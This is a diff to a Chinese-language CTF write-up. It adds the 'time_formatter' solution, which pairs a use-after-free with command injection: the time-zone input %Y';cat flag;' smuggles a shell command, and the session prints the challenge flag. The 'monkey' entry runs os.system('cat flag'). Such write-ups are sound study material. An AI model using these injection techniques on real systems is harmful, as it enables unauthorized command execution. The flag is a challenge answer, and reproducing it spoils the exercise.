@@ -240,7 +240,51 @@ sh.interactive()
 ```
 
 
-### 4. monkey
+### 6. monkey
 题目：暂无
 
 思路：运行后得到一个类似nodejs的解释器，使用os.system('cat flag')得到flag。
+
+
+### 7. time_formatter
+题目：将UNIX时间转换为日期是很困难的，所以玛丽编写了一个工具来完成这个任务。
+
+思路：退出时free内存的时候存在悬挂指针。
+
+程序在输出时间时使用了system，参数是使用时间格式字符串格式拼接而成，但是字符串格式输入时进行了过滤，不能直接使用命令注入。但是在退出时，时间格式字符串被free后成了悬挂指针，这时候利用设置时区重新分配一段内存，由于堆内存分配特点，这次分配的内存和上次释放的时间格式字符串内存指向同一个地址，因此此时时间格式字符串指向了时区字符串，而时区字符串是没有进行过滤的，再次拼接时就发生了命令注入。
+```python
+Welcome to Mary's Unix Time Formatter!
+1) Set a time format.
+2) Set a time.
+3) Set a time zone.
+4) Print your time.
+5) Exit.
+> 1
+Format: %Y
+Format set.
+1) Set a time format.
+2) Set a time.
+3) Set a time zone.
+4) Print your time.
+5) Exit.
+> 5
+Are you sure you want to exit (y/N)? N
+1) Set a time format.
+2) Set a time.
+3) Set a time zone.
+4) Print your time.
+5) Exit.
+> 3
+Time zone: %Y';cat flag;'
+Time zone set.
+1) Set a time format.
+2) Set a time.
+3) Set a time zone.
+4) Print your time.
+5) Exit.
+> 4
+Your formatted time is: sh: 1: /bin/date: not found
+cyberpeace{2c3475a0a0745a90418c2694c7dc54e4}
+sh: 1: : Permission denied
+1) Set a time format.
+```
